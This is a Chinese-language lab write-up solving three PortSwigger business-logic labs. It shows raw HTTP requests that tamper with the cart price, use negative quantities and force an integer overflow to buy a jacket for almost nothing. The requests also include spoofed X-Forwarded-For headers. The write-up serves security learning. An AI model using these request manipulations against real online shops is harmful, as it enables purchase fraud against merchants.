# Business logic vulnerabilities

## [Lab: Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)
### 題目敘述
 This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
竄改 POST 內容

### 解答
在加入購物車時會順便 POST 價格

```
POST /cart HTTP/1.1
Host: acd31fa31fe0b3dcc04314f500560069.web-security-academy.net
Cookie: session=IxPR6nrwBtk0VSUHVKPDmBuwG2IJVK8z
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://acd31fa31fe0b3dcc04314f500560069.web-security-academy.net
Referer: https://acd31fa31fe0b3dcc04314f500560069.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1&price=133700
```

竄改成 1 再去購物車結帳就好ㄌ


## [Lab: High-level logic vulnerability](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)
### 題目敘述
 This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
控制購買數量，可以是負的

### 解答

加到購物車後，數量的地方 改成買 -1 個

```
POST /cart HTTP/1.1
Host: ac451f941eb06c22c01c81e90025004d.web-security-academy.net
Cookie: session=B4CoFQLL3WfFvWwgwdl1rRca68KNbjPJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: https://ac451f941eb06c22c01c81e90025004d.web-security-academy.net
Referer: https://ac451f941eb06c22c01c81e90025004d.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close

productId=1&quantity=-2&redir=CART
```

但結帳時他會吐 `Cart total price cannot be less than zero `

所以再買一些普通的小東西讓價格 > 0

發現這樣不行，理論上應該反過來 (用其他商品扣錢) 才能真正買到 

最終買了 `-60` 個 `Vintage Neck Defender` 搭配 `1` 個 `Lightweight "l33t" Leather Jacket`，花了 9.8 元


## [Lab: Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)
### 題目敘述
 This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
int overflow

### 解答

測了一下，一次最多可以 `+99`
可以用 Burp 的 intruder 來送，送到他 Overflow

```
POST /cart HTTP/1.1
Host: ac941ffb1fde36c1c0580d1d0037001d.web-security-academy.net
Cookie: session=mSnfLlINi2GcygY9m1mKl9lp8RbLH9vR
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://ac941ffb1fde36c1c0580d1d0037001d.web-security-academy.net
Referer: https://ac941ffb1fde36c1c0580d1d0037001d.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close

productId=1&quantity=99&redir=CART&meow=§§
```

亂測了一下，他的價格是 int32，也就是超過 `2147483647` 就會變成負的

我們要買的東西是 `Lightweight "l33t" Leather Jacket`，價格是 `1337` 元

```
(2**32-1)/1337 = 3212391
np.int32(1337*3212391) = -529

3212391 // 99 = 32448
3212391 % 99 = 39
```

理論上這樣要發 32448 個 +99 的 Requests 跟一個 +39 的 Requests

但測試了一下發現被後的計算 Overflow 會把價格 * 100

也就是說其實計算要把價格用 `133700` 來算


```
(2**32-1)/133700 = 32123.91
np.int32(133700*32123) = -122196

32123 // 99 = 324
32123 % 99 = 47
```

所以要發 324 個 +99 的封包 跟一個 +46 的封包 (因為第一次買時已經 +1 ㄌ)

但真正發可能會有一些掉包的狀況發生，所以就自己湊一下讓 l33t 夾克變成 32123 個

再來湊數字，我買了 `13` 個 `98.26` 元的 `Giant Grasshopper` 以及 `32123` 個 `Lightweight "l33t" Leather Jacket` 最終花了`55.42`元


TBD